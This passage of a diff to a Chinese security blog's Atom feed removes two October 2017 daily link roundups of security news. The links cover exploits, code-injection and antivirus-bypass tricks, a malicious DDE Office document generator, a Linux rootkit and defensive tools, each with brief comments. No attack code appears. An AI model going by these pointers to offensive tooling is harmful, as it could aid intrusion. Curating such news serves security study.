97;&#50;&#x38;&#57;&#x33;&#54;&#x62;&#x66;</a></li>
+<li>二进制代码的模糊测试<br><a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#104;&#x74;&#x74;&#x70;&#x73;&#58;&#47;&#x2f;&#109;&#101;&#100;&#105;&#x75;&#x6d;&#x2e;&#99;&#111;&#109;&#x2f;&#64;&#x6e;&#106;&#118;&#111;&#x73;&#x73;&#50;&#x39;&#x39;&#x2f;&#97;&#102;&#108;&#45;&#117;&#x6e;&#x69;&#99;&#111;&#x72;&#x6e;&#45;&#x66;&#117;&#x7a;&#122;&#105;&#x6e;&#x67;&#45;&#x61;&#x72;&#98;&#x69;&#116;&#x72;&#x61;&#x72;&#121;&#45;&#x62;&#105;&#x6e;&#x61;&#114;&#x79;&#45;&#x63;&#111;&#100;&#101;&#x2d;&#53;&#x36;&#x33;&#99;&#97;&#50;&#x38;&#x39;&#51;&#x36;&#x62;&#102;">&#104;&#x74;&#x74;&#x70;&#x73;&#58;&#47;&#x2f;&#109;&#101;&#100;&#105;&#x75;&#x6d;&#x2e;&#99;&#111;&#109;&#x2f;&#64;&#x6e;&#106;&#118;&#111;&#x73;&#x73;&#50;&#x39;&#x39;&#x2f;&#97;&#102;&#108;&#45;&#117;&#x6e;&#x69;&#99;&#111;&#x72;&#x6e;&#45;&#x66;&#117;&#x7a;&#122;&#105;&#x6e;&#x67;&#45;&#x61;&#x72;&#98;&#x69;&#116;&#x72;&#x61;&#x72;&#121;&#45;&#x62;&#105;&#x6e;&#x61;&#114;&#x79;&#45;&#x63;&#111;&#100;&#101;&#x2d;&#53;&#x36;&#x33;&#99;&#97;&#50;&#x38;&#x39;&#51;&#x36;&#x62;&#102;</a></li>
 </ul>
 ]]></content>
     
@@ -823,105 +942,6 @@
     
       &lt;h4 id=&quot;安全动态&quot;&gt;&lt;a href=&quot;#安全动态&quot; class=&quot;headerlink&quot; title=&quot;安全动态&quot;&gt;&lt;/a&gt;安全动态&lt;/h4&gt;&lt;ul&gt;
 &lt;li&gt;PROPagate - 基于 SetWindowSubclass API 的代码注入新技巧&lt;br&gt;&lt;a href
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>20171030安全动态</title>
-    <link href="http://kevien.github.io/2017/10/30/20171030%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
-    <id>http://kevien.github.io/2017/10/30/20171030安全动态/</id>
-    <published>2017-10-30T05:18:40.000Z</published>
-    <updated>2017-11-04T13:17:53.000Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="安全动态"><a href="#安全动态" class="headerlink" title="安全动态"></a>安全动态</h4><ul>
-<li>长亭科技利用 SQLite 漏洞攻击 Safari 的细节（ZDI-15-570, ZDI-17-360, ZDI-17-366, ZDI-17-367, ZDI-17-368, and ZDI-17-369）<br><a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf" target="_blank" rel="external">https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf</a></li>
-<li>使用 Voltage Fault Injection 实现 Linux 本地提权(Paper)<br><a href="https://www.riscure.com/uploads/2017/10/Riscure_Whitepaper_Escalating_Privileges_in_Linux_using_Fault_Injection.pdf" target="_blank" rel="external">https://www.riscure.com/uploads/2017/10/Riscure_Whitepaper_Escalating_Privileges_in_Linux_using_Fault_Injection.pdf</a></li>
-<li>Crypton - F5 Networks 研究员开发的一个工具，用于解密恶意样本中的加密内容，提高恶意软件逆向分析效率：<br><a href="https://www.virusbulletin.com/blog/2017/10/vb2017-paper/" target="_blank" rel="external">https://www.virusbulletin.com/blog/2017/10/vb2017-paper/</a></li>
-<li><p>Stage-RemoteDll - 用 PowerShell 实现 NtCreateThreadEx/ QueueUserAPC/ SetThreadContext/ SetWindowsHookEx DLL 注入技术<br><a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Stage-RemoteDll.ps1" target="_blank" rel="external">https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Stage-RemoteDll.ps1</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">不知道是不是一个绕过av的方法</div></pre></td></tr></table></figure>
-</li>
-<li><p>使用 XSS 绕过 CSRF 防御<br><a href="https://dl.packetstormsecurity.net/papers/attack/Using_XSS_to_bypass_CSRF_protection.pdf" target="_blank" rel="external">https://dl.packetstormsecurity.net/papers/attack/Using_XSS_to_bypass_CSRF_protection.pdf</a></p>
-</li>
-<li><p>正则表达式基础库源码审计与漏洞分析<br><a href="http://www.freebuf.com/vuls/151430.html" target="_blank" rel="external">http://www.freebuf.com/vuls/151430.html</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">web安全很多的绕过都是绕过正则规则的</div></pre></td></tr></table></figure>
-</li>
-<li><p>如何安全地将你的文件藏在图片中<br><a href="http://hackingnewstutorials.com/how-to-safely-hide-your-files-and-folders-inside-images/" target="_blank" rel="external">http://hackingnewstutorials.com/how-to-safely-hide-your-files-and-folders-inside-images/</a></p>
-</li>
-<li>mashing the Stack for Fun &amp; Profit : Revived<br><a href="https://avicoder.me/papers/pdf/smashthestack.pdf" target="_blank" rel="external">https://avicoder.me/papers/pdf/smashthestack.pdf</a></li>
-<li>Powershell Empire 绕过AV实现远控<br><a href="http://bobao.360.cn/learning/detail/4628.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4628.html</a></li>
-<li>hack with github 编选的 10 月份 Top 5 安全工具<br><a href="https://medium.com/hack-with-github/top-5-security-tools-october-2017-76ab31834efd" target="_blank" rel="external">https://medium.com/hack-with-github/top-5-security-tools-october-2017-76ab31834efd</a></li>
-<li>把一个恶意样本 PE 文件头部的 “This program cannot be run in DOS mode” 中的 “This” 改为 “That”，可以 Bypass 11 款杀软<br><a href="https://twitter.com/zerosum0x0/status/925486850399019009/photo/1" target="_blank" rel="external">https://twitter.com/zerosum0x0/status/925486850399019009/photo/1</a></li>
-<li>揭秘：两张A4纸破解虹膜、人脸识别，百度安全技术小哥怎么做到的？<br><a href="https://mp.weixin.qq.com/s/zq7D8YzjljJ8rsteib1ljA" target="_blank" rel="external">https://mp.weixin.qq.com/s/zq7D8YzjljJ8rsteib1ljA</a></li>
-<li>Google Bug Tracker 存在漏洞可越权查看未修复漏洞的报告<br><a href="https://threatpost.com/flaw-in-google-bug-tracker-exposed-reports-about-unpatched-vulnerabilities/128687" target="_blank" rel="external">https://threatpost.com/flaw-in-google-bug-tracker-exposed-reports-about-unpatched-vulnerabilities/128687</a><br><a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#104;&#x74;&#x74;&#112;&#115;&#58;&#47;&#47;&#109;&#101;&#100;&#x69;&#117;&#109;&#46;&#x63;&#111;&#109;&#x2f;&#64;&#97;&#x6c;&#x65;&#120;&#46;&#98;&#105;&#114;&#x73;&#x61;&#x6e;&#47;&#109;&#x65;&#115;&#115;&#x69;&#110;&#103;&#45;&#x77;&#x69;&#x74;&#104;&#x2d;&#116;&#104;&#x65;&#45;&#x67;&#111;&#111;&#x67;&#108;&#x65;&#45;&#98;&#x75;&#103;&#x61;&#110;&#105;&#x7a;&#101;&#x72;&#x2d;&#x73;&#121;&#x73;&#116;&#x65;&#x6d;&#45;&#102;&#x6f;&#114;&#x2d;&#x31;&#x35;&#x2d;&#54;&#48;&#48;&#45;&#x69;&#110;&#45;&#x62;&#111;&#x75;&#110;&#x74;&#x69;&#x65;&#115;&#45;&#53;&#56;&#x66;&#x38;&#x36;&#99;&#x63;&#57;&#x66;&#x39;&#97;&#x35;">&#104;&#x74;&#x74;&#112;&#115;&#58;&#47;&#47;&#109;&#101;&#100;&#x69;&#117;&#109;&#46;&#x63;&#111;&#109;&#x2f;&#64;&#97;&#x6c;&#x65;&#120;&#46;&#98;&#105;&#114;&#x73;&#x61;&#x6e;&#47;&#109;&#x65;&#115;&#115;&#x69;&#110;&#103;&#45;&#x77;&#x69;&#x74;&#104;&#x2d;&#116;&#104;&#x65;&#45;&#x67;&#111;&#111;&#x67;&#108;&#x65;&#45;&#98;&#x75;&#103;&#x61;&#110;&#105;&#x7a;&#101;&#x72;&#x2d;&#x73;&#121;&#x73;&#116;&#x65;&#x6d;&#45;&#102;&#x6f;&#114;&#x2d;&#x31;&#x35;&#x2d;&#54;&#48;&#48;&#45;&#x69;&#110;&#45;&#x62;&#111;&#x75;&#110;&#x74;&#x69;&#x65;&#115;&#45;&#53;&#56;&#x66;&#x38;&#x36;&#99;&#x63;&#57;&#x66;&#x39;&#97;&#x35;</a></li>
-<li>Office-DDE-Payloads - 生成嵌入 DDE 的 恶意 Office 文档的脚本<br><a href="https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads" target="_blank" rel="external">https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads</a></li>
-<li>Ironsquirrel - 以加密的方式将浏览器漏洞利用代码发往受害者浏览器的工具<br><a href="https://github.com/MRGEffitas/Ironsquirrel" target="_blank" rel="external">https://github.com/MRGEffitas/Ironsquirrel</a></li>
-<li>LIEF - 之前推送过这个工具，QuarksLab 开源的一个跨平台可执行文件格式（PE/ELF/MachO）的解析、修改、抽象库，QuarksLab 昨天更新了一篇介绍 LIEF 库用法的 Blog<br><a href="https://blog.quarkslab.com/have-fun-with-lief-and-executable-formats.html" target="_blank" rel="external">https://blog.quarkslab.com/have-fun-with-lief-and-executable-formats.html</a></li>
-<li>恶意样本分析手册–特殊方法篇<br><a href="http://blog.nsfocus.net/malicious-sample-analysis-manual/" target="_blank" rel="external">http://blog.nsfocus.net/malicious-sample-analysis-manual/</a></li>
-<li>天翼校园客户端被植入病毒 中毒电脑被用来“挖矿”<br><a href="http://www.freebuf.com/column/152827.html" target="_blank" rel="external">http://www.freebuf.com/column/152827.html</a></li>
-<li>IoT设备通信安全讨论<br><a href="https://cert.360.cn/report/detail?id=5da919662c3c60f5004e513756fc4562" target="_blank" rel="external">https://cert.360.cn/report/detail?id=5da919662c3c60f5004e513756fc4562</a></li>
-<li>LKM Linux rootkit<br><a href="https://github.com/f0rb1dd3n/Reptile" target="_blank" rel="external">https://github.com/f0rb1dd3n/Reptile</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4>好久没看书了，主要是一直埋在项目里面，最近不怎么忙了，继续看看书</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;安全动态&quot;&gt;&lt;a href=&quot;#安全动态&quot; class=&quot;headerlink&quot; title=&quot;安全动态&quot;&gt;&lt;/a&gt;安全动态&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;长亭科技利用 SQLite 漏洞攻击 Safari 的细节（ZDI-15-570, ZDI-17-360, ZD
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>20171028安全动态</title>
-    <link href="http://kevien.github.io/2017/10/28/20171028%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
-    <id>http://kevien.github.io/2017/10/28/20171028安全动态/</id>
-    <published>2017-10-28T03:35:09.000Z</published>
-    <updated>2017-10-28T11:56:11.000Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="安全动态"><a href="#安全动态" class="headerlink" title="安全动态"></a>安全动态</h4><ul>
-<li>黑客适用的贝叶斯数学<br><a href="https://camdavidsonpilon.github.io/Probabilistic-Programming-and-Bayesian-Methods-for-Hackers/" target="_blank" rel="external">https://camdavidsonpilon.github.io/Probabilistic-Programming-and-Bayesian-Methods-for-Hackers/</a></li>
-<li>新的代码注入技巧<br><a href="http://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/" target="_blank" rel="external">http://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/</a></li>
-<li>H2HC大会黑客样例代码<br><a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="external">https://github.com/joaomatosf/JavaDeserH2HC</a></li>
-<li>舰船卫星通信系统中现后门<br><a href="https://www.bleepingcomputer.com/news/security/backdoor-account-found-in-popular-ship-satellite-communications-system" target="_blank" rel="external">https://www.bleepingcomputer.com/news/security/backdoor-account-found-in-popular-ship-satellite-communications-system</a></li>
-<li>微软公布其开源扫描工具Sonar<br><a href="https://github.com/sonarwhal/sonar" target="_blank" rel="external">https://github.com/sonarwhal/sonar</a></li>
-<li><p>基于欺诈的检测技术<br><a href="https://github.com/0x4D31/deception-as-detection" target="_blank" rel="external">https://github.com/0x4D31/deception-as-detection</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">这个挺有意思</div></pre></td></tr></table></figure>
-</li>
-<li><p>社交应用Sarahah分析<br><a href="https://scotthelme.co.uk/sarahah/" target="_blank" rel="external">https://scotthelme.co.uk/sarahah/</a></p>
-</li>
-<li>戴尔对一个关键域名失去控制长达一个月之久<br><a href="https://krebsonsecurity.com/2017/10/dell-lost-control-of-key-customer-support-domain-for-a-month-in-2017/" target="_blank" rel="external">https://krebsonsecurity.com/2017/10/dell-lost-control-of-key-customer-support-domain-for-a-month-in-2017/</a></li>
-<li>Snatchloader分析<br><a href="https://www.arbornetworks.com/blog/asert/snatchloader-reloaded/" target="_blank" rel="external">https://www.arbornetworks.com/blog/asert/snatchloader-reloaded/</a></li>
-<li><p>微软Windows10加入反勒索软件特性<br><a href="https://www.bleepingcomputer.com/news/microsoft/windows-10s-controlled-folder-access-anti-ransomware-feature-is-now-live/" target="_blank" rel="external">https://www.bleepingcomputer.com/news/microsoft/windows-10s-controlled-folder-access-anti-ransomware-feature-is-now-live/</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">good news</div></pre></td></tr></table></figure>
-</li>
-<li><p>模糊了就完了？针对模糊的二维码逆推！<br><a href="https://medium.freecodecamp.org/lets-enhance-how-we-found-rogerkver-s-1000-wallet-obfuscated-private-key-8514e74a5433" target="_blank" rel="external">https://medium.freecodecamp.org/lets-enhance-how-we-found-rogerkver-s-1000-wallet-obfuscated-private-key-8514e74a5433</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">不错的文章，新的攻击思路</div></pre></td></tr></table></figure>
-</li>
-<li><p>WAF与静态统计分析<br><a href="http://blog.ptsecurity.com/2017/10/do-wafs-dream-of-static-analyzers.html" target="_blank" rel="external">http://blog.ptsecurity.com/2017/10/do-wafs-dream-of-static-analyzers.html</a></p>
-</li>
-<li>反射PE打包：新的打包方式介绍<br><a href="https://pentest.blog/introducing-new-packing-method-first-reflective-pe-packer/" target="_blank" rel="external">https://pentest.blog/introducing-new-packing-method-first-reflective-pe-packer/</a></li>
-<li>对于Redis用户来说，本地运行可能是一个主要的安全风险<br><a href="https://blog.bugreplay.com/2017/05/for-users-of-redis-running-locally-can-be-dangerous.html" target="_blank" rel="external">https://blog.bugreplay.com/2017/05/for-users-of-redis-running-locally-can-be-dangerous.html</a></li>
-<li>使用DDE实现MSWord脚本注入<br><https: medium.com="" @5yx="" dde-word-exec-3e57cc45b401=""></https:></li>
-<li>docker-onion-nmap：使用nmap再Tor网络上扫描隐藏的”onion”服务<br><a href="https://github.com/milesrichardson/docker-onion-nmap" target="_blank" rel="external">https://github.com/milesrichardson/docker-onion-nmap</a></li>
-<li>泄露文档表明NSA早已开始利用KRACK攻击<br><a href="http://securityaffairs.co/wordpress/64601/hacking/krack-attack-nsa.html" target="_blank" rel="external">http://securityaffairs.co/wordpress/64601/hacking/krack-attack-nsa.html</a></li>
-<li><p>链接劫持——过期链接利用<br><a href="https://edoverflow.com/2017/broken-link-hijacking/" target="_blank" rel="external">https://edoverflow.com/2017/broken-link-hijacking/</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">还有这种操作？</div></pre></td></tr></table></figure>
-</li>
-<li><p>Shodan检查脚本<br><a href="https://github.com/juliocesarfort/netscreen-shodan-scanner" target="_blank" rel="external">https://github.com/juliocesarfort/netscreen-shodan-scanner</a></p>
-</li>
-<li>Apache James 3.0.1 JMX Server Deserialization 反序列化漏洞分析<br><a href="https://nickbloor.co.uk/2017/10/22/analysis-of-cve-2017-12628/" target="_blank" rel="external">https://nickbloor.co.uk/2017/10/22/analysis-of-cve-2017-12628/</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;安全动态&quot;&gt;&lt;a href=&quot;#安全动态&quot; class=&quot;headerlink&quot; title=&quot;安全动态&quot;&gt;&lt;/a&gt;安全动态&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;黑客适用的贝叶斯数学&lt;br&gt;&lt;a href=&quot;https://camdavidsonpilon.github.i
     
     </summary>
     
